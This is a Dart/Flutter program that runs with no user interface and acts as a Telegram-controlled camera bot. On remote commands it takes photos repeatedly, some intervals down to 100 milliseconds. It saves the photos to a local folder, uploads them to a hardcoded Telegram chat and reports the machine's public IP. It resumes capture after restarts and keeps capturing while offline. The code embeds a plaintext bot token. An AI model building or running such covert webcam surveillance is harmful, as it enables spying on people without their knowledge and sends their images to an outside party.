// ignore_for_file: prefer_final_fields

import 'dart:async';
import "dart:io";
import 'package:camera_platform_interface/camera_platform_interface.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:televerse/televerse.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

final String bot_token = "7541455648:AAHB4k27beqnIcC6L_AZng1tRN1mXie6PG4";
final ChatID chat_id = new ChatID(1056396152);

void main() async {
  // runApp(const MyApp());
  var bot = Bot(bot_token);
  
  Future<void> restarttt() async {
    try {
      await bot.stop();
      await Process.start('telegram', []);
      exit(0);
    }catch(e){print("Failed to start apps, restart canceled!");}
  }

  WidgetsFlutterBinding.ensureInitialized();

  List<CameraDescription> _cameras = <CameraDescription>[];
  int _cameraIndex = 0;
  int _cameraId = -1;
  bool _initialized = false;
  bool pictureSended = false;
  bool connectedToNetwork = false;
  bool tpicture = false;

  List<CameraDescription> cameras = <CameraDescription>[];

  int cameraIndex = 1;
  MediaSettings _mediaSettings = const MediaSettings(
    resolutionPreset: ResolutionPreset.max,
    fps: 15,
    videoBitrate: 200000,
    audioBitrate: 32000,
    enableAudio: true,
  );

  Future<String> getPublicIP() async {
    try {
      var response = await http.get(Uri.parse('https://api.ipify.org'));
      if (response.statusCode == 200) {
        // The response body is the IP in plain text, so just
        // return it as-is.
        return response.body;
      } else {
        // The request failed with a non-200 code
        // The ipify.org API has a lot of guaranteed uptime
        // promises, so this shouldn't ever actually happen.
        print(response.statusCode);
        print(response.body);
        return "";
      }
    } catch (e) {
      // Request failed due to an error, most likely because
      // the phone isn't connected to the internet.
      print(e);
      return e.toString();
    }
  }

  var timer = Timer(Duration(minutes: 1), () {});

  Future<void> stopTimer() async {
    
    final SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setBool('timer_run', false);
    await prefs.setInt('timer_duration', 0);
    print("Stopping Timer");
    try {
      await bot.api.sendMessage(chat_id, "Stopping Timer");
    } catch (e) {}
    timer.cancel();
    try {
      await CameraPlatform.instance.dispose(_cameraId);

      _initialized = false;
      _cameraId = -1;
    } catch (e) {
      try {
        await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
      } catch (e) {}
    }
  }

  Future<void> takePicture2(int intrvl) async {
    WidgetsFlutterBinding.ensureInitialized();
    if(intrvl != 0){
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('timer_run', true);
      await prefs.setInt('timer_duration', intrvl);
    }
    try {
      if(intrvl == 0){
        await CameraPlatform.instance.dispose(_cameraId);
        serializeExposureMode(ExposureMode.locked);
        int cameraId = -1;
        final int cameraIndex = _cameraIndex % _cameras.length;
        final CameraDescription camera = _cameras[cameraIndex];
        cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);

        final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
        await CameraPlatform.instance.initializeCamera(cameraId);
        await initialized;

        _initialized = true;
        _cameraId = cameraId;
        _cameraIndex = cameraIndex;
        String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
        final XFile file = await CameraPlatform.instance.takePicture(_cameraId);  
        String targetPath = "C:/data/";
        final originalFile = File(file.path);
        try{
          final originalFile2 = await originalFile.copy(targetPath + newName);
          await originalFile.delete();
          if (connectedToNetwork) {
          print("Connected to Network, Sending to Telegram");
          try {
            await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
          } catch (e) {
            print("Failed sending to telegram, Network Disconnected!");
          }
        }
        }catch(e){
          try {
            await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
            await originalFile.delete();
          } catch (e) {}
        }      
        try {
          await CameraPlatform.instance.dispose(_cameraId);

          _initialized = false;
          _cameraId = -1;
        } catch (e) {
          try {
            await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
          } catch (e) {}
        }
      }
      else if(intrvl < 10){
        await CameraPlatform.instance.dispose(_cameraId);
        serializeExposureMode(ExposureMode.locked);
        int cameraId = -1;
        final int cameraIndex = _cameraIndex % _cameras.length;
        final CameraDescription camera = _cameras[cameraIndex];
        cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);

        final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
        await CameraPlatform.instance.initializeCamera(cameraId);
        await initialized;

        _initialized = true;
        _cameraId = cameraId;
        _cameraIndex = cameraIndex;
        timer = Timer.periodic(new Duration(seconds: intrvl), (timer) async {
          try{
            String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
            final XFile file = await CameraPlatform.instance.takePicture(_cameraId);
            String targetPath = "C:/data/";
            final originalFile = File(file.path);
            try{
              final originalFile2 = await originalFile.copy( targetPath + newName);
              await originalFile.delete();
              if (connectedToNetwork) {
              print("Connected to Network, Sending to Telegram");
              try {
                await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
              } catch (e) {
                print("Failed sending to telegram, Network Disconnected!");
              }
            }
            }catch(e){
              try {
                await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
                await originalFile.delete();
              } catch (e) {}
            }
          }catch(e){
            try {
              await bot.api.sendMessage(chat_id, "Error on Taking Picture 2");
            } catch (e) {}
          }

          
        });
      }
      else if(intrvl >= 10 && intrvl < 100){
        timer = Timer.periodic(new Duration(seconds: intrvl), (timer) async {
          await CameraPlatform.instance.dispose(_cameraId);
          serializeExposureMode(ExposureMode.locked);
          int cameraId = -1;
          final int cameraIndex = _cameraIndex % _cameras.length;
          final CameraDescription camera = _cameras[cameraIndex];
          cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);

          final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
          await CameraPlatform.instance.initializeCamera(cameraId);
          await initialized;

          _initialized = true;
          _cameraId = cameraId;
          _cameraIndex = cameraIndex;

          String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
          final XFile file = await CameraPlatform.instance.takePicture(_cameraId);          
          try {
            await CameraPlatform.instance.dispose(_cameraId);

            _initialized = false;
            _cameraId = -1;
          } catch (e) {
            try {
              await bot.api.sendMessage(chat_id, "Failed to dispose Camera");
            } catch (e) {}
          }
          String targetPath = "C:/data/";
          final originalFile = File(file.path);          
          try{
            final originalFile2 = await originalFile.copy( targetPath + newName);
            await originalFile.delete();
            if (connectedToNetwork) {
            print("Connected to Network, Sending to Telegram");
            try {
              await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
            } catch (e) {
              print("Failed sending to telegram, Network Disconnected!");
            }
          }
          }catch(e){
            try {
              await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
              await originalFile.delete();
            } catch (e) {}
          }
        }); 
      }
      else if(intrvl >= 100 && intrvl <= 1000){
        await CameraPlatform.instance.dispose(_cameraId);
        serializeExposureMode(ExposureMode.locked);
        int cameraId = -1;
        final int cameraIndex = _cameraIndex % _cameras.length;
        final CameraDescription camera = _cameras[cameraIndex];
        cameraId = await CameraPlatform.instance.createCameraWithSettings(camera, _mediaSettings);

        final Future<CameraInitializedEvent> initialized = CameraPlatform.instance.onCameraInitialized(cameraId).first;
        await CameraPlatform.instance.initializeCamera(cameraId);
        await initialized;

        _initialized = true;
        _cameraId = cameraId;
        _cameraIndex = cameraIndex;
        timer = Timer.periodic(new Duration(milliseconds: intrvl), (timer) async {
          String newName = (new DateTime.now().microsecondsSinceEpoch).toString();
          final XFile file = await CameraPlatform.instance.takePicture(_cameraId);
          String targetPath = "C:/data/";
          final originalFile = File(file.path);
          // await originalFile.rename("%userprofile%/Pictures/" + newName);
          try{
            final originalFile2 = await originalFile.copy( targetPath + newName);
            await originalFile.delete();
            if (connectedToNetwork) {
            print("Connected to Network, Sending to Telegram");
            try {
              await bot.api.sendPhoto(chat_id, InputFile.fromFile(originalFile2));
            } catch (e) {
              print("Failed sending to telegram, Network Disconnected!");
            }
          }
          }catch(e){
            try {
              await bot.api.sendMessage(chat_id, "Failed to copy photo on save dir, deleting original file");
              await originalFile.delete();
            } catch (e) {}
          }

          
        });
      }
    } catch (e) {
      try {
        await bot.api.sendMessage(chat_id, "Error on Taking Picture 2");
      } catch (e) {}
    }
  }

  void startTimerOnDisconnected() async {
    print("Starting Disconnected Timer");
    try {
      cameras = await CameraPlatform.instance.availableCameras();
      if (!cameras.isEmpty) {
        cameraIndex = _cameraIndex % cameras.length;
      }
    } catch (e) {
      try {
        await bot.api.sendMessage(chat_id, "Error on reading camera");
      } catch (e) {}
    }

    _cameraIndex = cameraIndex;
    _cameras = cameras;
    await stopTimer();
    takePicture2(10);
  }

  void startTimer(int intrvl) async {
    print("Starting Timer");
    timer.cancel();
    try {
      if(intrvl < 100) await bot.api.sendMessage(chat_id, "Starting Timer Per " + intrvl.toString() + " Seconds");
      else await bot.api.sendMessage(chat_id, "Starting Timer Per " + intrvl.toString() + " Milliseconds");
    } catch (e) {}
    try {
      cameras = await CameraPlatform.instance.availableCameras();
      if (!cameras.isEmpty) {
        cameraIndex = _cameraIndex % cameras.length;
      }
    } catch (e) {}

    _cameraIndex = cameraIndex;
    _cameras = cameras;
    tpicture = false;
    takePicture2(intrvl);
  }

  void startTimer2() async {
    print("Starting Picture");
    try {
      await bot.api.sendMessage(chat_id, "Taking Picture");
    } catch (e) {}

    pictureSended = false;

    try {
      cameras = await CameraPlatform.instance.availableCameras();
      if (!cameras.isEmpty) {
        cameraIndex = _cameraIndex % cameras.length;
      }
    } catch (e) {
      await bot.api.sendMessage(chat_id, "Error on reading camera");
    }

    _cameraIndex = cameraIndex;
    _cameras = cameras;
    tpicture = true;
    takePicture2(0);
    timer.cancel();
  }

  // startTimer();
  /// Setup the /start command handler
  ///
  ///

  Future<void> botCommand() async {
    await bot.stop();
    bot = Bot(bot_token);
    bot.command('start', (ctx) async => await ctx.reply("Bot Active"));

    bot.command('p', (ctx) async => startTimer2());

    bot.command('t01', (ctx) async => startTimer(100));
    bot.command('t02', (ctx) async => startTimer(200));
    bot.command('t03', (ctx) async => startTimer(300));
    bot.command('t04', (ctx) async => startTimer(400));
    bot.command('t05', (ctx) async => startTimer(500));
    bot.command('t06', (ctx) async => startTimer(600));
    bot.command('t07', (ctx) async => startTimer(700));
    bot.command('t08', (ctx) async => startTimer(800));
    bot.command('t09', (ctx) async => startTimer(900));
    bot.command('t1', (ctx) async => startTimer(1));
    bot.command('t2', (ctx) async => startTimer(2));
    bot.command('t3', (ctx) async => startTimer(3));
    bot.command('t4', (ctx) async => startTimer(4));
    bot.command('t5', (ctx) async => startTimer(5));
    bot.command('t6', (ctx) async => startTimer(6));
    bot.command('t7', (ctx) async => startTimer(7));
    bot.command('t8', (ctx) async => startTimer(8));
    bot.command('t9', (ctx) async => startTimer(9));
    bot.command('t10', (ctx) async => startTimer(10));
    bot.command('t20', (ctx) async => startTimer(20));
    bot.command('t30', (ctx) async => startTimer(30));
    bot.command('t40', (ctx) async => startTimer(40));
    bot.command('t50', (ctx) async => startTimer(50));
    bot.command('t60', (ctx) async => startTimer(60));

    bot.command('stop', (ctx) async => stopTimer());
    bot.command('s', (ctx) async => stopTimer());
    bot.command('ip', (ctx) async => await ctx.reply(await getPublicIP()));

    bot.command('restart', (ctx) async {
      ctx.reply("Restarting Bot");
      Timer(Duration(seconds: 1), () => restarttt());
    });
  }

  try {
    StreamSubscription<List<ConnectivityResult>> subscription = Connectivity().onConnectivityChanged.listen((List<ConnectivityResult> result) async {
      // Received changes in available connectivity types!
      if (result.contains(ConnectivityResult.none))
        connectedToNetwork = false;
      else
        connectedToNetwork = true;

      if (connectedToNetwork) {
        print("Connected to network, Starting bot after 5s");
        Timer(Duration(seconds: 5), () async {
          print("Starting bot");
          try {
            await botCommand();
            await bot.api.sendMessage(chat_id, "Bot Connected to Network, Starting Bot");
            await bot.start();
            print("Bot Started");
            final SharedPreferences prefs = await SharedPreferences.getInstance();
            final bool? timer_run = prefs.getBool('timer_run');
            final int? timer_duration = prefs.getInt('timer_duration');
            if(timer_run!){
              await bot.api.sendMessage(chat_id, "Load Previously Timer");
              startTimer(timer_duration ?? 1);
            }
          } catch (e) {
            print("Bot Failed to Start");
            var timeStartBot = Timer.periodic(Duration(seconds: 1), (timer) {});
            timeStartBot = Timer.periodic(Duration(seconds: 5), (timer) async {
              try {
                await botCommand();
                await bot.api.sendMessage(chat_id, "Bot Connected to Network, Starting Bot");
                await bot.start();
                print("Bot Started");
                print("Try Again to Starting Bot");
                timeStartBot.cancel();
                
                final SharedPreferences prefs = await SharedPreferences.getInstance();
                final bool? timer_run = prefs.getBool('timer_run');
                final int? timer_duration = prefs.getInt('timer_duration');
                if(timer_run!){
                  await bot.api.sendMessage(chat_id, "Load Previously Timer");
                  startTimer(timer_duration ?? 1);
                }
              } catch (e) {
                print("Bot Failed to Start");
              }
            });
          }
        });
      }
      if (!connectedToNetwork) {
        print("Disconnected from network");
        await bot.stop();
        startTimerOnDisconnected();
      }
    });
  } catch (e) {
    try {
      await bot.api.sendMessage(chat_id, "Error on reading Wifi");
    } catch (e) {}
  }
}
